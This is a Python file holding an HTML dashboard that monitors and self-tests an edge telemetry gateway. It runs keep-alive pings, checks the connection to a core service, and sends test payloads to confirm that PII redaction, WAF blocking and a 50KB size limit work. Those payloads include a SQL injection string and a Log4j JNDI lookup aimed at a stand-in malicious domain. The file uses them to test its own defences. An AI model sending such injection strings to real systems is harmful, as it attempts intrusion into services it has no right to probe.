"""Interactive Web Testing Cockpit & Keep-Alive Sentinel for Server A Edge Gateway.

Provides a self-contained, lightweight dashboard for:
1. Visualizing edge gateway health & uptime
2. Keeping free-tier cloud instances (Render, Fly.io) awake via automated heartbeat pings
3. Testing Server A -> Server B inter-service connectivity
4. Simulating live telemetry crashes, PII scrubbing, and security attack mitigations
"""

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ichnoscope Edge Gateway | Live Status & Test Cockpit</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #090D16;
      --surface: #111827;
      --surface-elevated: #1F2937;
      --border: #2D3748;
      --border-accent: #3B82F6;
      --primary: #3B82F6;
      --primary-gradient: linear-gradient(135deg, #3B82F6 0%, #06B6D4 100%);
      --text: #F3F4F6;
      --text-muted: #9CA3AF;
      --success: #10B981;
      --danger: #EF4444;
      --warning: #F59E0B;
      --code-bg: #050811;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: var(--bg);
      color: var(--text);
      font-family: 'Plus Jakarta Sans', sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background-image: 
        radial-gradient(circle at 15% 20%, rgba(59, 130, 246, 0.08) 0%, transparent 40%),
        radial-gradient(circle at 85% 75%, rgba(6, 182, 212, 0.08) 0%, transparent 40%);
    }

    header {
      border-bottom: 1px solid var(--border);
      padding: 1rem 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: rgba(17, 24, 39, 0.7);
      backdrop-filter: blur(12px);
      position: sticky;
      top: 0;
      z-index: 50;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 0.75rem;
    }

    .logo-badge {
      background: var(--primary-gradient);
      width: 36px;
      height: 36px;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 800;
      color: white;
      font-size: 1.1rem;
      box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
    }

    .brand h1 {
      font-size: 1.15rem;
      font-weight: 700;
      letter-spacing: -0.02em;
    }

    .brand span {
      color: var(--text-muted);
      font-size: 0.8rem;
      font-weight: 500;
      display: block;
    }

    .live-indicator {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      background: rgba(16, 185, 129, 0.1);
      border: 1px solid rgba(16, 185, 129, 0.3);
      padding: 0.35rem 0.85rem;
      border-radius: 9999px;
      font-size: 0.8rem;
      font-weight: 600;
      color: var(--success);
    }

    .pulse-dot {
      width: 8px;
      height: 8px;
      background: var(--success);
      border-radius: 50%;
      box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
      animation: pulse 1.8s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
      70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); }
      100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
    }

    main {
      flex: 1;
      max-width: 1200px;
      width: 100%;
      margin: 0 auto;
      padding: 2rem 1.5rem;
      display: grid;
      grid-template-columns: 1fr 1.2fr;
      gap: 2rem;
    }

    @media (max-width: 960px) {
      main { grid-template-columns: 1fr; }
    }

    .card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 1.5rem;
      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
      display: flex;
      flex-direction: column;
      gap: 1.25rem;
    }

    .card-title {
      font-size: 1.05rem;
      font-weight: 700;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    /* Keep Alive Sentinel Banner */
    .sentinel-box {
      background: linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(6, 182, 212, 0.05) 100%);
      border: 1px solid rgba(59, 130, 246, 0.3);
      border-radius: 12px;
      padding: 1.15rem;
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    .sentinel-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .sentinel-title {
      font-size: 0.9rem;
      font-weight: 700;
      color: #93C5FD;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .sentinel-stats {
      font-size: 0.8rem;
      color: var(--text-muted);
      line-height: 1.4;
    }

    .stats-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 0.75rem;
    }

    .stat-item {
      background: var(--surface-elevated);
      padding: 0.85rem;
      border-radius: 10px;
      border: 1px solid var(--border);
    }

    .stat-label {
      font-size: 0.75rem;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.05em;
    }

    .stat-val {
      font-size: 1.15rem;
      font-weight: 700;
      margin-top: 0.25rem;
      font-family: 'JetBrains Mono', monospace;
    }

    /* Action Buttons & Presets */
    .preset-group {
      display: flex;
      flex-direction: column;
      gap: 0.6rem;
    }

    .btn {
      padding: 0.75rem 1rem;
      border-radius: 10px;
      font-weight: 600;
      font-size: 0.85rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1px solid var(--border);
      background: var(--surface-elevated);
      color: var(--text);
      transition: all 0.2s ease;
      font-family: inherit;
    }

    .btn:hover {
      border-color: var(--primary);
      transform: translateY(-1px);
    }

    .btn-primary {
      background: var(--primary-gradient);
      border: none;
      color: white;
      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
    }

    .btn-primary:hover {
      box-shadow: 0 6px 18px rgba(59, 130, 246, 0.5);
    }

    .btn-danger {
      border-color: rgba(239, 68, 68, 0.3);
      background: rgba(239, 68, 68, 0.08);
      color: #FCA5A5;
    }

    .btn-danger:hover {
      border-color: var(--danger);
      background: rgba(239, 68, 68, 0.15);
    }

    .badge-sub {
      font-size: 0.7rem;
      padding: 0.2rem 0.5rem;
      border-radius: 6px;
      background: rgba(255, 255, 255, 0.1);
      font-family: 'JetBrains Mono', monospace;
    }

    /* Terminal Console */
    .terminal-container {
      background: var(--code-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      flex: 1;
      min-height: 420px;
    }

    .terminal-header {
      background: #0D1322;
      padding: 0.6rem 1rem;
      border-bottom: 1px solid var(--border);
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.75rem;
      font-family: 'JetBrains Mono', monospace;
      color: var(--text-muted);
    }

    .terminal-body {
      padding: 1rem;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.8rem;
      line-height: 1.5;
      color: #A5F3FC;
      overflow-y: auto;
      max-height: 480px;
      white-space: pre-wrap;
      word-break: break-all;
    }

    .status-badge {
      display: inline-block;
      padding: 0.2rem 0.6rem;
      border-radius: 6px;
      font-size: 0.75rem;
      font-weight: 700;
    }
    .status-202 { background: rgba(16, 185, 129, 0.2); color: #34D399; border: 1px solid #10B981; }
    .status-400 { background: rgba(245, 158, 11, 0.2); color: #FBBF24; border: 1px solid #F59E0B; }
    .status-413 { background: rgba(239, 68, 68, 0.2); color: #F87171; border: 1px solid #EF4444; }

    footer {
      border-top: 1px solid var(--border);
      padding: 1.25rem 2rem;
      text-align: center;
      font-size: 0.8rem;
      color: var(--text-muted);
    }
  </style>
</head>
<body>

  <header>
    <div class="brand">
      <div class="logo-badge">I</div>
      <div>
        <h1>Ichnoscope Edge Telemetry Gateway</h1>
        <span>ZONE 2: DMZ Security Perimeter (Server A)</span>
      </div>
    </div>
    <div class="live-indicator">
      <div class="pulse-dot"></div>
      <span id="gatewayStatus">GATEWAY ONLINE</span>
    </div>
  </header>

  <main>
    <!-- Left Column: Controls & Sentinel -->
    <div class="card">
      <div class="card-title">
        <span>⚡</span> Keep-Alive Sentinel & Bridge Status
      </div>

      <!-- Keep Alive Sentinel Box -->
      <div class="sentinel-box">
        <div class="sentinel-header">
          <div class="sentinel-title">
            <span>🛡️</span> Render Keep-Alive Heartbeat
          </div>
          <span class="badge-sub" id="heartbeatCountdown">Ping in 240s</span>
        </div>
        <div class="sentinel-stats">
          Background sentinel periodically pings <code>/healthz</code> every 4 minutes to prevent Render free-tier cold starts.
        </div>
        <div style="font-size: 0.75rem; color: #94A3B8;">
          Total Pings Fired: <strong id="pingCounter" style="color: white;">0</strong>
        </div>
      </div>

      <!-- Core Server Connection Status -->
      <div class="stats-grid">
        <div class="stat-item">
          <div class="stat-label">Edge Node</div>
          <div class="stat-val" style="color: #60A5FA;">Server A</div>
        </div>
        <div class="stat-item">
          <div class="stat-label">Core Bridge</div>
          <div class="stat-val" id="coreBridgeStatus" style="color: #34D399;">CONNECTED</div>
        </div>
      </div>

      <button class="btn" onclick="testCoreConnection()" id="btnCheckCore">
        <span>🔄 Test Server B (Core Bridge) Handshake</span>
        <span class="badge-sub">GET /api/ping-core</span>
      </button>

      <hr style="border: none; border-top: 1px solid var(--border); margin: 0.5rem 0;">

      <div class="card-title">
        <span>🧪</span> Live Telemetry Simulation Cockpit
      </div>
      <p style="font-size: 0.8rem; color: var(--text-muted);">
        Dispatch test exceptions to verify edge authentication, 50KB limits, PII sanitization, and attack defenses.
      </p>

      <div class="preset-group">
        <button class="btn btn-primary" onclick="dispatchValidCrash()">
          <div>
            <div>1. Standard Crash with Sensitive PII</div>
            <div style="font-size: 0.7rem; opacity: 0.8;">KeyError with raw emails & tokens -> Verifies DLP Redaction</div>
          </div>
          <span class="badge-sub">POST 202</span>
        </button>

        <button class="btn btn-danger" onclick="dispatchAttackPayload('sqli')">
          <div>
            <div>2. Attack Vector: SQL Injection (SQLi)</div>
            <div style="font-size: 0.7rem; opacity: 0.8;">UNION SELECT attack -> Verifies WAF Shield Block</div>
          </div>
          <span class="badge-sub">BLOCK 400</span>
        </button>

        <button class="btn btn-danger" onclick="dispatchAttackPayload('rce')">
          <div>
            <div>3. Attack Vector: RCE / Log4j Injection</div>
            <div style="font-size: 0.7rem; opacity: 0.8;">${jndi:ldap exploit token -> Verifies Edge Interception</div>
          </div>
          <span class="badge-sub">BLOCK 400</span>
        </button>

        <button class="btn" onclick="dispatchOversizedPayload()">
          <div>
            <div>4. DoS Defense: 55KB Payload Ceiling</div>
            <div style="font-size: 0.7rem; opacity: 0.8;">Exceeds strict 50KB limit -> Verifies HTTP 413</div>
          </div>
          <span class="badge-sub">BLOCK 413</span>
        </button>
      </div>
    </div>

    <!-- Right Column: Live Terminal & Verification Stream -->
    <div class="terminal-container">
      <div class="terminal-header">
        <div>LIVE TELEMETRY INSPECTION TERMINAL</div>
        <div id="latencyTag">LATENCY: -- ms</div>
      </div>
      <div class="terminal-body" id="terminalLog">
[SYSTEM INIT] Server A Ingestion Gateway active on port 8001
[GUARDRAIL] TLS termination active
[GUARDRAIL] Slowloris 2.5s read timeout armed
[GUARDRAIL] Hard request body ceiling: <= 50,000 bytes
[GUARDRAIL] DLP & PII scrubber pattern specs loaded
[BRIDGE] Ready to forward clean incidents to Server B

Select an action on the left to fire a live test...
      </div>
    </div>
  </main>

  <footer>
    Ichnoscope Autonomous Incident Intelligence Platform &bull; v2.1.0 High-Security Edge DMZ
  </footer>

  <script>
    let pingsFired = 0;
    let countdown = 240;

    // Automated Keep-Alive Heartbeat (Every 4 minutes)
    setInterval(() => {
      countdown--;
      if (countdown <= 0) {
        countdown = 240;
        fireHeartbeat();
      }
      document.getElementById('heartbeatCountdown').innerText = `Ping in ${countdown}s`;
    }, 1000);

    async function fireHeartbeat() {
      try {
        const start = performance.now();
        const res = await fetch('/healthz');
        const latency = Math.round(performance.now() - start);
        if (res.ok) {
          pingsFired++;
          document.getElementById('pingCounter').innerText = pingsFired;
          logTerminal(`[KEEP-ALIVE SENTINEL] Pinged /healthz -> 200 OK (${latency}ms) [Render Awake]`);
        }
      } catch (err) {
        logTerminal(`[KEEP-ALIVE WARNING] Failed to ping /healthz: ${err.message}`);
      }
    }

    function logTerminal(message) {
      const term = document.getElementById('terminalLog');
      const time = new Date().toLocaleTimeString();
      term.innerHTML = `[${time}] ${message}\n\n` + term.innerHTML;
    }

    // 1. Test Core Bridge Handshake
    async function testCoreConnection() {
      const btn = document.getElementById('btnCheckCore');
      btn.innerText = "⏳ Checking Core Handshake...";
      const start = performance.now();

      try {
        const res = await fetch('/api/ping-core');
        const latency = Math.round(performance.now() - start);
        document.getElementById('latencyTag').innerText = `LATENCY: ${latency} ms`;
        const data = await res.json();

        if (res.ok) {
          logTerminal(`[CORE BRIDGE HANDSHAKE OK] Status: HTTP ${res.status}\n` + JSON.stringify(data, null, 2));
          document.getElementById('coreBridgeStatus').innerText = "ONLINE";
          document.getElementById('coreBridgeStatus').style.color = "#34D399";
        } else {
          logTerminal(`[CORE BRIDGE ISSUE] HTTP ${res.status}\n` + JSON.stringify(data, null, 2));
        }
      } catch (err) {
        logTerminal(`[CORE BRIDGE ERROR] Network failure: ${err.message}`);
        document.getElementById('coreBridgeStatus').innerText = "DISCONNECTED";
        document.getElementById('coreBridgeStatus').style.color = "#EF4444";
      } finally {
        btn.innerText = "🔄 Test Server B (Core Bridge) Handshake";
      }
    }

    // 2. Dispatch Valid Crash with PII
    async function dispatchValidCrash() {
      const start = performance.now();
      const payload = {
        event_id: "demo_crash_" + Math.random().toString(16).substring(2, 8),
        environment: "production",
        exception: {
          values: [{
            type: "KeyError",
            value: "payment_token missing for customer user_alice@company.com with token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.fake_jwt",
            stacktrace: {
              frames: [{
                filename: "services/billing.py",
                lineno: 142,
                function: "charge_customer",
                in_app: true
              }]
            }
          }]
        },
        request: {
          headers: {
            "Authorization": "Bearer secret_test_token_12345",
            "Cookie": "session_id=prod_cookie_8910"
          }
        }
      };

      try {
        const res = await fetch('/api/1/store/', {
          method: 'POST',
          headers: {
            'X-Sentry-Auth': 'Sentry sentry_version=7, sentry_key=sentry_public_key',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        const latency = Math.round(performance.now() - start);
        document.getElementById('latencyTag').innerText = `LATENCY: ${latency} ms`;
        const data = await res.json();

        logTerminal(`[TELEMETRY INGESTED] <span class="status-badge status-202">HTTP 202 ACCEPTED</span> (${latency}ms)\n` +
          `• Event ID: ${data.id}\n` +
          `• Edge Sanitizer: Stripped Authorization, Cookie, Email & JWT\n` +
          `• Fast ACK: Responded in ${latency}ms\n` +
          `• Forwarding: Delivered to Server B Core as 'staged_raw' (Gate 1)`);
      } catch (err) {
        logTerminal(`[DISPATCH ERROR] ${err.message}`);
      }
    }

    // 3. Dispatch Attack Vector Simulation
    async function dispatchAttackPayload(type) {
      const start = performance.now();
      let payload = {};

      if (type === 'sqli') {
        payload = {
          event_id: "attack_sqli",
          error: "SELECT * FROM users WHERE username = 'admin' OR 1=1 --"
        };
      } else {
        payload = {
          event_id: "attack_rce",
          log: "Exploit attempt: ${jndi:ldap://malicious-domain.com/a}"
        };
      }

      try {
        const res = await fetch('/api/v1/telemetry/ingest', {
          method: 'POST',
          headers: {
            'X-Ignoscope-Token': 'demo_key',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        const latency = Math.round(performance.now() - start);
        document.getElementById('latencyTag').innerText = `LATENCY: ${latency} ms`;
        const data = await res.json();

        logTerminal(`[WAF SECURITY SHIELD INTERCEPTED] <span class="status-badge status-400">HTTP ${res.status} BLOCKED</span> (${latency}ms)\n` +
          `• Violation: ${data.detail || 'Malicious signature detected'}\n` +
          `• Defense Action: Packet dropped at edge before buffering.`);
      } catch (err) {
        logTerminal(`[ATTACK TEST ERROR] ${err.message}`);
      }
    }

    // 4. Dispatch Oversized Payload (55KB)
    async function dispatchOversizedPayload() {
      const start = performance.now();
      const largeData = {
        event_id: "oversized_test",
        dump: "X".repeat(56000) // 56KB
      };

      try {
        const res = await fetch('/api/v1/telemetry/ingest', {
          method: 'POST',
          headers: {
            'X-Ignoscope-Token': 'demo_key',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(largeData)
        });

        const latency = Math.round(performance.now() - start);
        document.getElementById('latencyTag').innerText = `LATENCY: ${latency} ms`;
        const data = await res.json();

        logTerminal(`[CEILING GUARD INTERCEPTED] <span class="status-badge status-413">HTTP ${res.status} PAYLOAD TOO LARGE</span> (${latency}ms)\n` +
          `• Violation: ${data.detail || 'Payload size exceeded 50KB'}\n` +
          `• Defense Action: Connection terminated to prevent memory exhaustion.`);
      } catch (err) {
        logTerminal(`[CEILING TEST ERROR] ${err.message}`);
      }
    }

    // Initial ping on page load
    fireHeartbeat();
  </script>
</body>
</html>
"""
